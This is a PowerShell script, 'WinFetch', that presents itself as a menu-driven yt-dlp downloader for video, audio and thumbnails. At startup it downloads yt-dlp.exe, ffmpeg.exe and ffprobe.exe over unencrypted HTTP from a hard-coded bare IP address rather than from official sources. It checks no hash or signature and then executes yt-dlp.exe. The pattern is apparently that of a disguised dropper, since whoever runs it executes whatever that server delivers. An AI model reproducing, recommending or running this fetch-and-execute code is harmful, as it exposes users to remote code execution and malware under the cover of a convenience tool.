<#
.SYNOPSIS
    WinFetch - Fast YT-DLP Downloader
.DESCRIPTION
    Zero-footprint video/audio downloader with parallel binary fetching.
    Supports custom server hosting for faster binary delivery.
#>

# ============================================================================
# CONFIGURATION
# ============================================================================
$Config = @{
    TempDir      = Join-Path $env:TEMP "winfetch"
    OutputDir    = [Environment]::GetFolderPath("MyDocuments") -replace 'Documents$','Downloads'
    
    # Binary paths
    YtDlp        = $null  # Set in Init
    Ffmpeg       = $null
    Ffprobe      = $null
    
    # Server URL - all binaries fetched from here
    ServerUrl    = "http://74.226.163.201:8080"
    
    # Download sources (auto-configured from ServerUrl)
    Sources      = @{
        YtDlp    = "http://74.226.163.201:8080/yt-dlp.exe"
        Ffmpeg   = "http://74.226.163.201:8080/ffmpeg.exe"
        Ffprobe  = "http://74.226.163.201:8080/ffprobe.exe"
    }
}

# Sources already configured in $Config, using server only

# Initialize paths
$Config.YtDlp    = Join-Path $Config.TempDir "yt-dlp.exe"
$Config.Ffmpeg   = Join-Path $Config.TempDir "ffmpeg.exe"
$Config.Ffprobe  = Join-Path $Config.TempDir "ffprobe.exe"

# ============================================================================
# UI HELPERS
# ============================================================================
function Write-UI {
    param([string]$Msg, [ValidateSet('Info','OK','Warn','Err','Run')]$Type = 'Info')
    $c = @{ Info='Gray'; OK='Green'; Warn='Yellow'; Err='Red'; Run='Cyan' }
    $p = @{ Info='[i]'; OK='[✓]'; Warn='[!]'; Err='[✗]'; Run='[→]' }
    Write-Host "$($p[$Type]) $Msg" -ForegroundColor $c[$Type]
}

function Show-Banner {
    Clear-Host
    Write-Host @"
╔═══════════════════════════════════════════════════════════════╗
║                    WinFetch - Fast Downloader                 ║
╠═══════════════════════════════════════════════════════════════╣
║  Zero footprint • Parallel init • Server-ready                ║
╚═══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
}

function Read-Choice {
    param([string]$Prompt, [string[]]$Options, [switch]$AllowBack)
    
    Write-Host "`n$Prompt" -ForegroundColor Yellow
    for ($i = 0; $i -lt $Options.Count; $i++) {
        Write-Host "  [$($i+1)] $($Options[$i])"
    }
    if ($AllowBack) { Write-Host "  [0] Back" -ForegroundColor DarkGray }
    Write-Host "  [Q] Quit" -ForegroundColor DarkGray
    
    while ($true) {
        $r = Read-Host ">"
        if ($r -match '^[Qq]$') { return -1 }
        if ($AllowBack -and $r -eq '0') { return 0 }
        if ($r -match '^\d+$' -and [int]$r -ge 1 -and [int]$r -le $Options.Count) {
            return [int]$r
        }
        Write-Host "Invalid" -ForegroundColor Red
    }
}

# ============================================================================
# BINARY MANAGEMENT - Parallel Downloads
# ============================================================================
function Get-Binary {
    param([string]$Url, [string]$OutFile, [string]$Name)
    
    Write-UI "Downloading $Name..." Run
    try {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -TimeoutSec 300
        return $true
    } catch {
        Write-UI "Failed: $_" Err
        return $false
    }
}

function Get-FfmpegFromZip {
    param([string]$Url)
    
    $zip = Join-Path $Config.TempDir "ffmpeg.zip"
    $extract = Join-Path $Config.TempDir "ffmpeg-tmp"
    
    Write-UI "Downloading ffmpeg..." Run
    try {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $Url -OutFile $zip -UseBasicParsing -TimeoutSec 600
        
        Write-UI "Extracting ffmpeg..." Run
        Expand-Archive -Path $zip -DestinationPath $extract -Force
        
        # Find and copy binaries
        $ff = Get-ChildItem -Path $extract -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
        $fp = Get-ChildItem -Path $extract -Recurse -Filter "ffprobe.exe" | Select-Object -First 1
        
        if ($ff) { Copy-Item $ff.FullName -Destination $Config.Ffmpeg -Force }
        if ($fp) { Copy-Item $fp.FullName -Destination $Config.Ffprobe -Force }
        
        # Cleanup
        Remove-Item $zip -Force -EA SilentlyContinue
        Remove-Item $extract -Recurse -Force -EA SilentlyContinue
        
        return (Test-Path $Config.Ffmpeg)
    } catch {
        Write-UI "Failed: $_" Err
        return $false
    }
}

function Initialize-Binaries {
    # Create temp dir
    if (-not (Test-Path $Config.TempDir)) {
        New-Item -ItemType Directory -Path $Config.TempDir -Force | Out-Null
    }
    
    $needYtDlp = -not (Test-Path $Config.YtDlp)
    $needFfmpeg = -not (Test-Path $Config.Ffmpeg) -or -not (Test-Path $Config.Ffprobe)
    
    if (-not $needYtDlp -and -not $needFfmpeg) {
        Write-UI "Binaries cached" OK
        return $true
    }
    
    $ProgressPreference = 'SilentlyContinue'
    
    # Download yt-dlp
    if ($needYtDlp) {
        Write-UI "Downloading yt-dlp..." Run
        try {
            Invoke-WebRequest -Uri $Config.Sources.YtDlp -OutFile $Config.YtDlp -UseBasicParsing -TimeoutSec 120
            Write-UI "yt-dlp OK" OK
        } catch {
            Write-UI "yt-dlp failed: $_" Err
        }
    }
    
    # Download ffmpeg
    if ($needFfmpeg) {
        $ffmpegUrl = $Config.Sources.Ffmpeg
        $isDirectExe = $ffmpegUrl -match '\.exe$'
        
        if ($isDirectExe) {
            # Direct .exe download (from custom server)
            Write-UI "Downloading ffmpeg..." Run
            try {
                Invoke-WebRequest -Uri $ffmpegUrl -OutFile $Config.Ffmpeg -UseBasicParsing -TimeoutSec 120
                Write-UI "ffmpeg OK" OK
            } catch {
                Write-UI "ffmpeg failed: $_" Err
            }
            
            # Also download ffprobe if server provides it
            if ($Config.Sources.Ffprobe) {
                Write-UI "Downloading ffprobe..." Run
                try {
                    Invoke-WebRequest -Uri $Config.Sources.Ffprobe -OutFile $Config.Ffprobe -UseBasicParsing -TimeoutSec 120
                    Write-UI "ffprobe OK" OK
                } catch {
                    Write-UI "ffprobe failed: $_" Err
                }
            }
        } else {
            # Zip download (GitHub/Gyan)
            Write-UI "Downloading ffmpeg (zip)..." Run
            $zip = Join-Path $Config.TempDir "ffmpeg.zip"
            $extract = Join-Path $Config.TempDir "ffmpeg-tmp"
            
            try {
                Invoke-WebRequest -Uri $ffmpegUrl -OutFile $zip -UseBasicParsing -TimeoutSec 600
                
                Write-UI "Extracting ffmpeg..." Run
                Expand-Archive -Path $zip -DestinationPath $extract -Force
                
                $ff = Get-ChildItem -Path $extract -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
                $fp = Get-ChildItem -Path $extract -Recurse -Filter "ffprobe.exe" | Select-Object -First 1
                
                if ($ff) { Copy-Item $ff.FullName -Destination $Config.Ffmpeg -Force }
                if ($fp) { Copy-Item $fp.FullName -Destination $Config.Ffprobe -Force }
                
                Remove-Item $zip -Force -EA SilentlyContinue
                Remove-Item $extract -Recurse -Force -EA SilentlyContinue
                Write-UI "ffmpeg OK" OK
            } catch {
                Write-UI "ffmpeg failed: $_" Err
            }
        }
    }
    
    # Verify
    $ok = (Test-Path $Config.YtDlp) -and (Test-Path $Config.Ffmpeg)
    if ($ok) { Write-UI "All binaries ready" OK }
    else { Write-UI "Binary init failed" Err }
    return $ok
}

# ============================================================================
# YT-DLP WRAPPER
# ============================================================================
function Invoke-YtDlp {
    param([string[]]$YtArgs)

    if (-not (Test-Path $Config.YtDlp) -or -not (Test-Path $Config.Ffmpeg)) {
        Write-UI "Binaries missing, re-initializing..." Warn
        if (-not (Initialize-Binaries)) {
            Write-UI "Cannot run yt-dlp without binaries" Err
            return $false
        }
    }

    $baseArgs = @("--ffmpeg-location", $Config.TempDir, "--no-mtime")
    & $Config.YtDlp @baseArgs @YtArgs
    return $LASTEXITCODE -eq 0
}

# ============================================================================
# DOWNLOAD FUNCTIONS
# ============================================================================
function Start-Download {
    param(
        [ValidateSet('Video','Audio','Thumb')]$Mode,
        [string]$Url,
        [string]$Quality = "best",
        [string]$OutDir
    )
    
    if (-not $OutDir) { $OutDir = $Config.OutputDir }
    if (-not (Test-Path $OutDir)) { 
        New-Item -ItemType Directory -Path $OutDir -Force | Out-Null 
    }
    
    $template = Join-Path $OutDir "%(title)s.%(ext)s"
    $args = @("-o", $template, "--no-playlist", "--progress")
    
    switch ($Mode) {
        'Video' {
            $fmt = switch ($Quality) {
                "1080p" { "bestvideo[height<=1080][ext=mp4]+bestaudio[ext=m4a]/bestvideo[height<=1080]+bestaudio/best[height<=1080]" }
                "720p"  { "bestvideo[height<=720][ext=mp4]+bestaudio[ext=m4a]/bestvideo[height<=720]+bestaudio/best[height<=720]" }
                "480p"  { "bestvideo[height<=480][ext=mp4]+bestaudio[ext=m4a]/bestvideo[height<=480]+bestaudio/best[height<=480]" }
                default { "bestvideo[ext=mp4]+bestaudio[ext=m4a]/bestvideo+bestaudio/best" }
            }
            $args += @("-f", $fmt, "--merge-output-format", "mp4", "--embed-metadata")
        }
        'Audio' {
            $bitrate = if ($Quality -match '^\d+$') { $Quality } else { "320" }
            $args += @("-x", "--audio-format", "mp3", "--audio-quality", "${bitrate}K")
        }
        'Thumb' {
            $args += @("--write-thumbnail", "--skip-download", "--convert-thumbnails", "jpg")
        }
    }
    
    $args += $Url
    
    Write-Host ""
    if (Invoke-YtDlp -YtArgs $args) {
        Write-UI "Done! Saved to: $OutDir" OK
    } else {
        Write-UI "Download failed" Err
    }
}

function Menu-Video {
    Show-Banner
    Write-Host "`n=== Video Download ===" -ForegroundColor Yellow
    
    $url = Read-Host "URL"
    if (-not $url) { return }
    
    $q = Read-Choice "Quality" @("Best", "1080p", "720p", "480p") -AllowBack
    if ($q -le 0) { return }
    
    $quality = @("best", "1080p", "720p", "480p")[$q - 1]
    Start-Download -Mode Video -Url $url -Quality $quality
    
    Read-Host "`nEnter to continue"
}

function Menu-Audio {
    Show-Banner
    Write-Host "`n=== Audio Download ===" -ForegroundColor Yellow
    
    $url = Read-Host "URL"
    if (-not $url) { return }
    
    $q = Read-Choice "Bitrate" @("320 kbps", "256 kbps", "192 kbps", "128 kbps") -AllowBack
    if ($q -le 0) { return }
    
    $bitrate = @("320", "256", "192", "128")[$q - 1]
    Start-Download -Mode Audio -Url $url -Quality $bitrate
    
    Read-Host "`nEnter to continue"
}

function Menu-Thumbnail {
    Show-Banner
    Write-Host "`n=== Thumbnail Download ===" -ForegroundColor Yellow
    
    $url = Read-Host "URL"
    if (-not $url) { return }
    
    Start-Download -Mode Thumb -Url $url
    
    Read-Host "`nEnter to continue"
}

function Menu-Batch {
    Show-Banner
    Write-Host "`n=== Batch Download ===" -ForegroundColor Yellow
    Write-Host "Enter URLs (one per line, empty line to finish):" -ForegroundColor Gray
    
    $urls = @()
    while ($true) {
        $u = Read-Host "URL"
        if (-not $u) { break }
        $urls += $u
    }
    
    if ($urls.Count -eq 0) { return }
    
    $mode = Read-Choice "Mode" @("Video (MP4)", "Audio (MP3)") -AllowBack
    if ($mode -le 0) { return }
    
    Write-Host "`nDownloading $($urls.Count) items..." -ForegroundColor Cyan
    
    foreach ($url in $urls) {
        Write-Host "`n--- $url ---" -ForegroundColor DarkGray
        if ($mode -eq 1) {
            Start-Download -Mode Video -Url $url
        } else {
            Start-Download -Mode Audio -Url $url
        }
    }
    
    Read-Host "`nEnter to continue"
}

function Menu-Cleanup {
    if (Test-Path $Config.TempDir) {
        Remove-Item -Path $Config.TempDir -Recurse -Force -EA SilentlyContinue
        Write-UI "Cleaned: $($Config.TempDir)" OK
    } else {
        Write-UI "Nothing to clean" Info
    }
    Read-Host "`nEnter to continue"
}

# ============================================================================
# MAIN
# ============================================================================
function Main {
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    
    Write-UI "Using server: $($Config.ServerUrl)" Info

    Show-Banner
    Write-Host ""
    
    if (-not (Initialize-Binaries)) {
        Write-UI "Cannot initialize binaries" Err
        Read-Host "Enter to exit"
        return
    }
    
    while ($true) {
        Show-Banner
        
        $choice = Read-Choice "Menu" @(
            "Video (MP4)",
            "Audio (MP3)",
            "Thumbnail",
            "Batch Download",
            "───────────────",
            "Clean Temp",
            "Exit"
        )
        
        switch ($choice) {
            1 { Menu-Video }
            2 { Menu-Audio }
            3 { Menu-Thumbnail }
            4 { Menu-Batch }
            5 { } # separator
            6 { Menu-Cleanup }
            7 { break }
            -1 { break }
        }
        
        if ($choice -eq 7 -or $choice -eq -1) { break }
    }
    
    Write-Host ""
    Write-UI "Bye!" OK
}

Main
